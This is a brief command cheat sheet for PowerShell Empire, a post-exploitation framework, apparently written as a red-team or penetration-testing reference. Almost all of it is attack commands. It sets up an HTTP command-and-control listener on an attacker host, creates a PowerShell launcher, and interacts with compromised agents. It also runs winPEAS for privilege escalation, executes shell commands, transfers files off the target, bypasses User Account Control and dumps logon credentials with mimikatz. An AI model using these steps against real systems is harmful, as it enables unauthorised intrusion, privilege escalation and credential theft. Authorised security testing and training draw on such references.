# empire, powershell-empire

pure PowerShell post-exploitation agent

## start a listener

```
listeners
uselistener http
set Host http://<host>:<port>
execute
```

## create a launcher

```
listeners
launcher powershell http
```

## interact with an agent

```
agents
interact <agent name>
```

### run winPEAS (Powershell 4.0+)

```
usemodule privesc/winPEAS
run
```

### run shell commands

```
shell <command> <arguments>
```

### upload/download files

```
upload /path/to/local/file
download /path/to/remote/file
```

### bypass User Account Control

```
bypassuac http
```

### dump logon password

```
mimikatz
creds
```

### list modules

```
usemodule <tab><tab>
```

## [...](https://www.powershellempire.com/)
